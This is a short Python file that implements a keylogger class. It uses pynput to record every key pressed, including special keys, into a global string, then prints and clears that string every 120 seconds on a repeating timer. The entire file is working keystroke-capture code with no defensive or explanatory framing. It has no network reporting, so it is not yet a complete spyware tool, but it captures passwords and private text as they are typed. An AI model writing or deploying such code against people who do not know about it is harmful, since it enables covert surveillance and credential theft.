import pynput.keyboard,threading
log=""

class keylog:
 
	def pkp(self,key):
		global log
		try:
			log=log+str(key.char)
		except  Exception as e:
			if key==key.space:
				log=log + " "
			else:
				log=log + " " + str(key) + " " 

	def report(self):

		global log
		print(log)
		log=""
		timer=threading.Timer(120,self.report)
		timer.start()

	def start(self):
		kl=pynput.keyboard.Listener(on_press=self.pkp)
		with kl:
			self.report()
			kl.join()
